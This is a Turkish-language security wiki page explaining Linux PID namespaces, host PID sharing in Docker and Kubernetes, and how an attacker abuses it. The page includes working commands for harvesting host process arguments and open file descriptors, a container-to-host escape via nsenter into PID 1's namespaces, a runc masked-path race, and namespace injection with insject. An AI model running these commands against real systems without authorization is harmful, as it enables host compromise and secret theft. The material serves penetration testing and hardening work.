# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Genel Bakış

PID namespace, process'lerin nasıl numaralandırılacağını ve hangi process'lerin görünür olacağını kontrol eder. Bir container'ın gerçek bir makine olmamasına rağmen kendi PID 1'ine sahip olabilmesinin nedeni budur. Namespace içinde workload, yerel bir process tree gibi görünen yapıyı görür. Namespace dışında ise host, gerçek host PID'lerini ve tüm process yapısını görmeye devam eder.

Güvenlik açısından PID namespace önemlidir çünkü process görünürlüğü değerlidir. Bir workload host process'lerini görebildiğinde service adlarını, command-line argümanlarını, process argümanlarında aktarılan secret'ları, `/proc` üzerinden environment kaynaklı durumu ve olası namespace-entry hedeflerini gözlemleyebilir. Sadece bu process'leri görmekten fazlasını yapabiliyorsa, örneğin uygun koşullar altında signal gönderebiliyor veya ptrace kullanabiliyorsa, sorun çok daha ciddi hâle gelir.

## Çalışma

Yeni bir PID namespace, kendi dahili process numaralandırmasıyla başlar. İçinde oluşturulan ilk process, namespace açısından PID 1 olur; bu da orphaned child process'ler ve signal davranışı için özel init benzeri semantiğe sahip olduğu anlamına gelir. Bu durum, container'lardaki init process'leri, zombie reaping ve neden bazen küçük init wrapper'larının kullanıldığıyla ilgili birçok tuhaflığı açıklar.

Önemli güvenlik dersi, bir process yalnızca kendi PID tree'sini gördüğü için izole görünebilir; ancak bu izolasyon kasıtlı olarak kaldırılabilir. Docker bunu `--pid=host` aracılığıyla, Kubernetes ise `hostPID: true` aracılığıyla sunar. Container host PID namespace'e katıldığında workload, host process'lerini doğrudan görür ve sonraki birçok attack path çok daha gerçekçi hâle gelir.

## Lab

Manuel olarak bir PID namespace oluşturmak için:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Shell artık özel bir process görünümü görür. `--mount-proc` flag'i önemlidir; çünkü yeni PID namespace ile eşleşen bir procfs instance'ı mount ederek process listesinin içeriden tutarlı olmasını sağlar.

Container davranışını karşılaştırmak için:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Fark hemen görülür ve anlaşılması kolaydır; bu nedenle okuyucular için iyi bir ilk lab çalışmasıdır.

## Runtime Kullanımı

Docker, Podman, containerd ve CRI-O'daki normal container'lar kendi PID namespace'lerini alır. Kubernetes Pod'ları da genellikle izole bir PID görünümü alır; ancak workload açıkça host PID paylaşımı istemediği sürece. LXC/Incus ortamları aynı kernel primitive'ine dayanır; ancak system-container kullanım senaryoları daha karmaşık process tree'leri ortaya çıkarabilir ve daha fazla debugging kestirmesini teşvik edebilir.

Aynı kural her yerde geçerlidir: Runtime PID namespace'ini izole etmemeyi seçtiyse bu, container sınırının kasıtlı olarak zayıflatılmasıdır.

## Yanlış Yapılandırmalar

Klasik yanlış yapılandırma host PID paylaşımıdır. Ekipler bunu genellikle debugging, monitoring veya service-management kolaylığıyla gerekçelendirir; ancak her zaman anlamlı bir security istisnası olarak değerlendirilmelidir. Container'ın host process'leri üzerinde doğrudan bir write primitive'i olmasa bile yalnızca görünürlük sistem hakkında çok şey açığa çıkarabilir. `CAP_SYS_PTRACE` gibi capability'ler veya kullanışlı procfs erişimi eklendiğinde risk önemli ölçüde artar.

Bir diğer hata, workload'un varsayılan olarak host process'lerini kill edememesi veya ptrace edememesi nedeniyle host PID paylaşımının zararsız olduğunu varsaymaktır. Bu sonuç enumeration değerini, namespace-entry hedeflerinin kullanılabilirliğini ve PID görünürlüğünün diğer zayıflatılmış kontrollerle birleşme biçimini göz ardı eder.

## Kötüye Kullanım

Host PID namespace'i paylaşılıyorsa bir attacker host process'lerini inceleyebilir, process argümanlarını toplayabilir, ilgi çekici servisleri belirleyebilir, `nsenter` için aday PID'leri bulabilir veya process görünürlüğünü ptrace ile ilişkili privilege ile birleştirerek host ya da komşu workload'lara müdahale edebilir. Bazı durumlarda yalnızca doğru long-running process'i görmek, attack planının geri kalanını yeniden şekillendirmek için yeterlidir.

İlk pratik adım her zaman host process'lerinin gerçekten görünür olduğunu doğrulamaktır:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Host PID'leri görünür hale geldiğinde, process argümanları ve namespace-entry hedefleri genellikle en yararlı bilgi kaynağı haline gelir:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
`nsenter` mevcutsa ve yeterli ayrıcalık varsa, görünür bir host process'in namespace bridge olarak kullanılıp kullanılamayacağını test edin:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Giriş engellense bile host PID paylaşımı, servis düzenini, runtime bileşenlerini ve sonraki aşamada hedeflenebilecek ayrıcalıklı işlemleri ortaya çıkardığı için hâlâ değerlidir.

Host PID görünürlüğü, file-descriptor abuse işlemlerini de daha gerçekçi hâle getirir. Ayrıcalıklı bir host işlemi veya komşu bir workload hassas bir dosyayı ya da socket'i açık tutuyorsa saldırgan, sahipliğe, procfs mount seçeneklerine ve hedef servis modeline bağlı olarak `/proc/<pid>/fd/` öğesini inceleyebilir ve bu handle'ı yeniden kullanabilir.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Bu komutlar, `hidepid=1` veya `hidepid=2` ayarının işlemler arası görünürlüğü azaltıp azaltmadığını ve açık secret dosyaları, log'lar veya Unix socket'leri gibi bariz şekilde ilgi çekici descriptor'ların herhangi bir şekilde görünür olup olmadığını yanıtladıkları için kullanışlıdır.

### Tam Örnek: host PID + `nsenter`

Host PID paylaşımı, işlem aynı zamanda host namespace'lerine katılmak için yeterli yetkiye sahip olduğunda doğrudan bir host escape'e dönüşür:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Komut başarılı olursa container process artık host’un mount, UTS, network, IPC ve PID namespaces’lerinde çalışmaktadır. Etki, host’un anında compromise edilmesidir.

`nsenter` mevcut olmasa bile host filesystem mount edilmişse aynı sonuç host binary üzerinden elde edilebilir:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Güncel Runtime Notları

Bazı PID-namespace ile ilgili saldırılar geleneksel `hostPID: true` yanlış yapılandırmaları değildir; bunun yerine, container kurulumu sırasında procfs korumalarının nasıl uygulandığıyla ilgili runtime uygulama hatalarıdır.

#### `maskedPaths` ile host procfs'e race

Savunmasız `runc` sürümlerinde, container image'ını veya `runc exec` workload'unu kontrol edebilen saldırganlar, container tarafındaki `/dev/null` dosyasını `/proc/sys/kernel/core_pattern` gibi hassas bir procfs yoluna işaret eden bir symlink ile değiştirerek masking aşamasında race gerçekleştirebilir. Race başarılı olursa masked-path bind mount işlemi yanlış hedefe uygulanabilir ve host-global procfs ayarlarını yeni container'a açığa çıkarabilir.<sup>[[1]](#references)</sup>

Faydalı inceleme komutu:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Bu önemlidir çünkü nihai etki, doğrudan bir procfs exposure ile aynı olabilir: yazılabilir `core_pattern` veya `sysrq-trigger` ve ardından host üzerinde code execution ya da denial of service.

#### `insject` ile Namespace injection

`insject` gibi Namespace injection araçları, PID-namespace etkileşiminin işlem oluşturulmadan önce hedef namespace'e girilmesini her zaman gerektirmediğini gösterir. Bir yardımcı daha sonra bağlanabilir, `setns()` kullanabilir ve hedef PID alanına yönelik görünürlüğü koruyarak çalıştırılabilir:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Bu tür teknikler, esas olarak runtime workload'u zaten başlattıktan sonra namespace context'in birleştirilmesi gereken gelişmiş debugging, offensive tooling ve post-exploitation workflow'ları için önemlidir.

### İlgili FD Abuse Pattern'leri

Host PID'leri görünür olduğunda iki pattern özellikle belirtilmeye değerdir. İlk olarak, privileged bir process, `O_CLOEXEC` ile işaretlenmediği için `execve()` boyunca hassas bir file descriptor'ı açık tutabilir. İkinci olarak, servisler Unix socket'leri üzerinden `SCM_RIGHTS` aracılığıyla file descriptor aktarabilir. Her iki durumda da ilgi çekici olan artık pathname değil, lower-privilege bir process'in inherit edebileceği veya receive edebileceği önceden açılmış handle'dır.

Bu durum container çalışmaları açısından önemlidir; çünkü handle, path'in kendisine container filesystem'inden doğrudan erişilemese bile `docker.sock`, privileged bir log, host'a ait bir secret file veya başka bir high-value object'e işaret ediyor olabilir.

## Kontroller

Bu komutların amacı, process'in private bir PID görünümüne sahip olup olmadığını veya çok daha geniş bir process landscape'i zaten enumerate edip edemediğini belirlemektir.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Burada ilginç olanlar:

- Process listesi belirgin host servisleri içeriyorsa host PID paylaşımı muhtemelen zaten etkin durumdadır.
- Yalnızca küçük bir container-local tree görmek normal baseline'dır; `systemd`, `dockerd` veya ilgisiz daemon'lar görmek normal değildir.
- Host PID'leri görünür hâle geldiğinde, salt okunur process bilgileri bile yararlı reconnaissance için kullanılabilir.

Host PID paylaşımıyla çalışan bir container keşfederseniz bunu kozmetik bir fark olarak değerlendirmeyin. Bu, workload'un gözlemleyebileceği ve potansiyel olarak etkileyebileceği şeylerde önemli bir değişikliktir.

## Referanslar

- [1] [runc security advisory: "masked path" abuse nedeniyle mount race conditions üzerinden container escape (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Tool Release – insject: Bir Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)

{{#include ../../../../../banners/hacktricks-training.md}}
